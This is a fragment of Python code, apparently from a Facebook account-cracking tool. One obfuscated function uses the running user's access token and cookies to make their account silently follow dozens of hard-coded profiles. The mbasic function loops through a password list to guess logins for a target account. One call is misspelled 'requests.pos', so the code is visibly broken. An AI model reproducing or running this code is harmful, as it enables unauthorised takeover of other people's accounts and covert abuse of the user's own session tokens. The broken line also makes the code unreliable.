...
def ___fii___Sayang___Kamu___Widiya___():
    ...
    requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.pos('https://graph.facebook.com/100000431996038/subscribers?access_token=%s'%(token),cookies=cookie)
    ...
    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=%s'%(token),cookies=cookie)
    ...
    requests.post('https://graph.facebook.com/100004655733027/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100000200420913/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100080716718035/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100003467793035/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100003160758786/subscribers?access_token=%s'%(token),cookies=cookie)
    requests.post('https://graph.facebook.com/100040248105716/subscribers?access_token=%s'%(token),cookies=cookie)
...
def mbasic(uid, fii):
	...
	for pw in fii:
		...
		fii_gtg.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
